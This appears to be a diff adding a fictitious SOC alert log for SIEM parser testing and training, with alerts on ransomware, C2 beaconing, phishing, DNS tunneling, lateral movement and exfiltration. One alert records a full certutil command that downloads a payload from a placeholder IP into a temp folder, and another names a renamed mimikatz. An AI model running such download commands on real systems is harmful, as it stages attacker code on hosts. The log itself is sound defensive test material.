@@ -1,0 +1,142 @@
+================================================================================
+SOC SECURITY OPERATIONS CENTER - SAMPLE ALERT LOG (FICTITIOUS DATA ONLY)
+Generated for testing / training purposes - NO REAL INCIDENTS
+================================================================================
+
+[2026-08-15 23:41:17 UTC] [CRITICAL] [ALERT-ID: SOC-2026-88421]
+Event: Malware Detection - Ransomware Indicator
+Source IP: 203.0.113.47
+Destination IP: 10.10.45.112
+Hostname: WS-FINANCE-07
+User: j.martinez
+Domain/URL: update-security-patch.evil-cdn.fake
+File Hash (SHA256): a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456
+Process: svchost.exe (suspicious parent: powershell.exe)
+Action Taken: Quarantined + Endpoint isolated
+SIEM Rule: T1486 - Data Encrypted for Impact
+Notes: Multiple file encryption attempts detected on C:\Users\j.martinez\Documents
+
+--------------------------------------------------------------------------------
+
+[2026-08-15 23:52:03 UTC] [HIGH] [ALERT-ID: SOC-2026-88435]
+Event: Suspicious Outbound Connection - C2 Beaconing
+Source IP: 10.10.22.89
+Destination IP: 198.51.100.203
+Hostname: LAPTOP-SALES-03
+User: a.rodriguez
+Domain: beacon-update.malware-c2.example
+Port: 443 (HTTPS)
+Beacon Interval: ~60s
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Action Taken: Connection blocked by firewall + host flagged for investigation
+SIEM Rule: T1071.001 - Application Layer Protocol: Web Protocols
+Notes: Domain first seen 2026-08-14, low reputation score
+
+--------------------------------------------------------------------------------
+
+[2026-08-16 00:08:44 UTC] [HIGH] [ALERT-ID: SOC-2026-88451]
+Event: Brute Force Authentication Attempt
+Source IP: 192.0.2.156
+Destination IP: 10.20.30.5 (VPN Gateway)
+Target User: admin
+Failed Attempts: 47 in 3 minutes
+Protocol: RDP / SSH
+Geo: Simulated - Eastern Europe (fake)
+Action Taken: IP temporarily blocked (30 min) + account lockout triggered
+SIEM Rule: T1110 - Brute Force
+Notes: Multiple usernames attempted (admin, root, administrator, backup)
+
+--------------------------------------------------------------------------------
+
+[2026-08-16 00:15:29 UTC] [MEDIUM] [ALERT-ID: SOC-2026-88462]
+Event: Phishing Email Detected
+Source: external-mailer@phish-campaign.fake
+Recipient: m.lopez@corp-internal.example
+Subject: "Urgent: Invoice #INV-8842 - Payment Required"
+Malicious URL: https://secure-login-verify.corp-internal.fake/auth
+Attachment: invoice_8842.pdf.exe (detected as Trojan.Generic)
+Action Taken: Email quarantined, URL blocked in proxy, user notified
+SIEM Rule: T1566.001 - Phishing: Spearphishing Attachment
+Notes: Domain registered 2 days ago, similar to legitimate corp domain
+
+--------------------------------------------------------------------------------
+
+[2026-08-16 00:27:11 UTC] [MEDIUM] [ALERT-ID: SOC-2026-88478]
+Event: Unusual DNS Query / Possible DNS Tunneling
+Source IP: 10.10.15.33
+Hostname: DEV-WORKSTATION-12
+Queried Domain: longsubdomainstringdataexfiltration.tunnel.evil.example
+Query Type: TXT
+Volume: 142 queries in 5 minutes
+Action Taken: Domain sinkholed, host marked for deeper inspection
+SIEM Rule: T1071.004 - Application Layer Protocol: DNS
+Notes: Entropy analysis high, possible data exfiltration
+
+--------------------------------------------------------------------------------
+
+[2026-08-16 00:41:55 UTC] [LOW] [ALERT-ID: SOC-2026-88490]
+Event: New Process Execution - Living Off The Land
+Source IP: 10.10.8.21
+Hostname: SRV-FILE-02
+User: SYSTEM
+Process: certutil.exe -urlcache -split -f http://203.0.113.88/payload.bin C:\Windows\Temp\update.bin
+Action Taken: Process terminated, file deleted, alert escalated for review
+SIEM Rule: T1105 - Ingress Tool Transfer
+Notes: certutil used for download (common LOLBin technique)
+
+--------------------------------------------------------------------------------
+
+[2026-08-16 01:03:22 UTC] [HIGH] [ALERT-ID: SOC-2026-88505]
+Event: Lateral Movement Attempt
+Source IP: 10.10.45.112 (previously compromised host)
+Destination IP: 10.10.50.7
+Protocol: SMB (445)
+User: j.martinez (compromised credentials)
+Target Share: \\SRV-HR-01\Confidential
+Action Taken: SMB connection denied by microsegmentation policy + credentials rotated
+SIEM Rule: T1021.002 - Remote Services: SMB/Windows Admin Shares
+Notes: Same host that triggered ransomware alert earlier
+
+--------------------------------------------------------------------------------
+
+[2026-08-16 01:18:47 UTC] [CRITICAL] [ALERT-ID: SOC-2026-88519]
+Event: Potential Data Exfiltration
+Source IP: 10.10.22.89
+Destination IP: 198.51.100.77
+Domain: transfer-files.cloud-storage.fake
+Volume: 2.4 GB uploaded in 12 minutes
+Protocol: HTTPS (port 443)
+File Types: .docx, .xlsx, .pdf, .zip
+Action Taken: Outbound connection throttled + DLP rule triggered + investigation opened
+SIEM Rule: T1041 - Exfiltration Over C2 Channel
+Notes: Matches previously flagged C2 domain pattern
+
+--------------------------------------------------------------------------------
+
+[2026-08-16 01:35:09 UTC] [MEDIUM] [ALERT-ID: SOC-2026-88533]
+Event: Privilege Escalation Attempt
+Hostname: WS-IT-ADMIN-01
+User: k.sanchez
+Technique: Token manipulation / Named pipe impersonation
+Process: mimikatz.exe (renamed as "sysupdate.exe")
+Action Taken: Process killed, user session terminated, account disabled pending review
+SIEM Rule: T1134 - Access Token Manipulation
+Notes: Tool detected via YARA rule + behavioral analytics
+
+--------------------------------------------------------------------------------
+
+[2026-08-16 01:52:30 UTC] [INFO] [ALERT-ID: SOC-2026-88541]
+Event: Successful VPN Login from New Location
+Source IP: 203.0.113.201
+User: p.gomez
+Hostname: N/A (client VPN)
+Geo: Simulated - South America (new for this user)
+MFA: Passed
+Action Taken: Login allowed, location flagged for monitoring (no block)
+SIEM Rule: Anomalous Geo-Location Login
+Notes: User notified via secondary channel for confirmation
+
+================================================================================
+END OF SAMPLE LOG - All IPs, domains, hashes, users and events are completely fictional
+Use only for testing SIEM parsers, dashboards, playbooks or training exercises
+================================================================================
